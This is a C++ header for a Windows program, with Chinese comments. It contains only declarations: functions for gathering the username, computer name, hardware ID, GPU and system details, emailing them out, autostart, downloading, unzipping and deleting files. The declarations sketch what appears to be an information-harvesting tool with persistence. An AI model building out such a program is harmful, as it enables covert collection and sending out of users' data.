#pragma once
#include "log.h"
#include <direct.h>
#include <iostream>
#include <windows.h>
#include <io.h>
#include <winbase.h>
#include "stdlib.h" //获取软件路径头文件
#include <string>
#include <ostream>
#include <fstream>
#include <tchar.h>

#pragma comment(lib , "DXGI.lib")
//下载模块定义
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"ws2_32.lib")
//GPU库
#include <DXGI.h>  
#include <vector>  
//


#pragma warning(disable : 4996)
//#pragma  comment(lib, "ws2_32.lib")
using namespace std;

void windows_text();
int windows_delete();
void guanbi();
int WINAPI_delete();

string windows_username();
void setcolor(unsigned short color);
wstring windows_computer_name();
//void windows_email_tage();
//void windows_email_main();
void Windows_email_tou_name();
void fstream_fish();//创建文本文档
void fstream_double(char username); //向文本文档写入数据
string wstring2string(wstring wstr);
string windows_user_name_noreturn(); //windows用户名称，无其他返回类型
void system_information_table();         //更改系统桌面(此函数暂时未得到测试)
string text_box_auto();    //邮件正文
void AutoStart();//AOTU START
void exe_path(); //软件路径
void email(); //邮件模块
void ifsteam_open_read();
void c_box_information();
string system_information();
string system_information_text();
string GetHWID();//HWID模块
int GPU_information();//GPU信息模块
std::string WStringToString(const std::wstring& wstr);
void download(string usl);//下载模块
int log();//日志模块
void file_decompression(string file_decompression_name);//解压测试模块
